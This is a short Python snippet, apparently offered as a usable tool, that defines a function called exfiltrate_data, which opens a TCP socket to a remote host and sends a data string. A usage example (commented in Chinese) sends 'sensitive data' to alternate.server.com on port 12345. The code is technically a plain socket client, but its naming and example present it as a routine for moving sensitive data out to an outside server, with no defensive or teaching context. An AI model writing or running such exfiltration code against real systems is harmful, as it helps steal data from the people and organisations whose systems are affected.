import socket

def exfiltrate_data(target_host, target_port, data):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))
    client.send(data.encode())
    response = client.recv(4096)
    print(response.decode())
    client.close()

# 使用範例
target_host = "alternate.server.com"
target_port = 12345
data = "sensitive data"
exfiltrate_data(target_host, target_port, data)